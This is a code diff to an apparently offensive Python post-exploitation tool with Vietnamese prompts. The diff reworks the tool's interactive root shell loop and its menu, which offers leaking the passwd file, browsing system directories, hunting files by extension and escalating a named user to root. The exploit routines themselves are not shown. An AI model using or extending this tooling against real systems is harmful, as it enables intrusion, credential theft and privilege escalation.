@@ -233,29 +233,37 @@ class exploit_tools():
         '''
         s = self.proc
         if(s.poll()==None):
+            # in_fd = s.stdin
+            # out_fd = s.stdout
+            # err_fd = s.stderr
+            # in2_fd = os.dup(in_fd)
+            # o2_fd = os.dup(out_fd)
+            # e2_fd = os.dup(err_fd) 
+            # s.interactive()
             while(1):
                 promt_symbols = f"{bcolors.FAIL}# {bcolors.ENDC}"
                 command = str(input(promt_symbols)).strip('\n')
                 if(command == 'qexit'):
                     log.info("Thoát root shell!")
                     break
-                if(command == 'exit'):
+                elif(command == 'exit'):
                     ret_value = yes_no_ask("Bạn có chắc muốn thoát cả tiến trình khai thác hay không? \n Gợi ý: qexit để thoát chức năng shell.")
                     if(ret_value == 1):
                         self.do_exit(0)
                         return
                     elif ret_value == -1: #chưa muốn thoát
                         continue
-                try:
+                elif(command == ''):
+                    continue
+                else:
+                    all_o = b''
                     s.sendline(command)
                     while(True):
-                        out = s.recvline(timeout=0.3).strip(b'\n').decode()
-                        if(out==''):
+                        out1 = s.recv(48).strip(b'\n')
+                        all_o += out1
+                        if(len(out1) < 48):
                             break
-                        print(out)
-                except:
-                    log.info("Tiến trình root shell đã đóng!")
-                    break
+                    print(all_o.decode())
         else:
             log.fail("Tiến trình root shell đã đóng!")
     
@@ -398,8 +406,13 @@ def after_exploit_tools(exploit_process:process):
         elif choice_tool == '5':
             tools.do_leak('passwd')
         elif choice_tool == '6':
-            in_use_mode = False
-            while(not in_use_mode):
+            '''
+            lấy path
+            lấy mode
+            thực thi
+            '''
+            in_use_mode = True
+            while(in_use_mode):
                 mode = ['''
                 Chế độ cụ thể xem với đệ quy thư mục
                 ├── linux
@@ -412,36 +425,39 @@ def after_exploit_tools(exploit_process:process):
                 ├── etc
                 ├── opt
                 ''']
+                mode_choice = 0
+
                 mode_choice = int(entry_dynamic_menu(mode,len(mode),'(mode)',symbols_color=bcolors.OKCYAN),10)
+
                 if(mode_choice == 1):
                     mode_choice = 'v'
                 elif mode_choice == 2:
                     mode_choice = 'd'
                 elif mode_choice == 0:
-                    in_use_mode = True
+                    in_use_mode = False
                     break
                 else:
                     log.fail("Không nhận ra chế độ ! BUG DETECT")
                 while(True):
                     path_ = str(input("Nhập đường dẫn muốn xem: ")).strip('\n')
-                        
+                    if(path_==''):
+                        continue 
                     tools.do_tree_path(mode=mode_choice,path=path_)
 
                     log.info(f"Bạn đang sử dụng chế độ {mode_choice}")
-                    log.info(f"Nhập 0 để quay lại menu hoặc enter để tiếp tục chế độ")
+                    log.info(f"Nhập 0 để quay lại menu hoặc bất kỳ phím khác để tiếp tục chế độ")
                     try:
                         ret_ = int(input("").strip("\n"),10)
                         if(ret_ == 0):
                             break
-                        else:
-                            log.fail("Không nhận ra lựa chọn")
                     except:
                         pass 
         elif choice_tool == '7':
             ext_ = ''
             path_ = ''
             # p1: lấy thông tin
-            path_ = str(input("Nhập đường dẫn muốn tìm\n>>> ")).strip('\n')
+            while(path_ == ''):
+                path_ = str(input("Nhập đường dẫn muốn tìm\n>>> ")).strip('\n')
             # in các thông tin có sẵn
             ext = 'txt pdf bat xls doc docx sh xml py c exe md'
             list_ext = ext.split(' ')
@@ -472,7 +488,8 @@ def after_exploit_tools(exploit_process:process):
             tools.do_findext(path_find=path_ , file_ext=ext_)
         elif choice_tool == '8':
             user = ''
-            user = str(input("Nhập tên user muốn nâng quyền\n>>> ").strip('\n'))
+            while(user == ''):
+                user = str(input("Nhập tên user muốn nâng quyền\n>>> ").strip('\n'))
             is_up_root_successed = tools.do_gain_root(user)
             if(is_up_root_successed==0):
                 log.info(f"Nâng quyền thành công cho {user}")
